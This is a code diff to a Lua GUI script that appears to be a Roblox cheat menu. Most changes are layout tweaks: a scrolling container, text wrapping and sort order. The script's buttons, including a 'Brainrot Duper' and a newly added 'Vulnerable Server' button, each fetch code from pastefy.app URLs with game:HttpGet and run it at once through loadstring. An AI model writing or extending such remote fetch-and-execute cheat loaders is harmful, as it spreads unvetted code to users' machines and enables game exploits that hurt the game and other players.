@@ -69,16 +69,20 @@ CloseButton.Parent = Frame
 local CloseCorner = Instance.new("UICorner", CloseButton)
 CloseCorner.CornerRadius = UDim.new(0, 8)
 
--- Button container
-local ButtonContainer = Instance.new("Frame")
+-- Scrollable Button container
+local ButtonContainer = Instance.new("ScrollingFrame")
 ButtonContainer.Size = UDim2.new(1, -20, 1, -70)
 ButtonContainer.Position = UDim2.new(0, 10, 0, 50)
 ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.ScrollBarThickness = 4
+ButtonContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+ButtonContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
 ButtonContainer.Parent = Frame
 
 local UIListLayout = Instance.new("UIListLayout", ButtonContainer)
 UIListLayout.Padding = UDim.new(0, 10)
 UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
 -- Function to create white-text buttons
 local function createButton(name, text, callback)
@@ -94,8 +98,9 @@ local function createButton(name, text, callback)
     button.Text = text
     button.Font = Enum.Font.GothamBold
     button.TextSize = 18
-    button.TextColor3 = Color3.fromRGB(255, 255, 255) -- PURE WHITE TEXT
-    button.TextStrokeTransparency = 1 -- disable red outline
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextStrokeTransparency = 1
+    button.TextWrapped = true
     button.Parent = wrapper
 
     local corner = Instance.new("UICorner", button)
@@ -123,6 +128,11 @@ end)
 
 createButton("Button3", "Brainrot Duper", function()
     loadstring(game:HttpGet("https://pastefy.app/fI0CcmL4/raw"))()
+end)
+
+-- New scrollable button (renamed and formatted)
+createButton("Button4", "Vulnerable Server\n(Private Server)", function()
+    loadstring(game:HttpGet("https://pastefy.app/Hmd4FmZX/raw"))()
 end)
 
 -- Close behavior
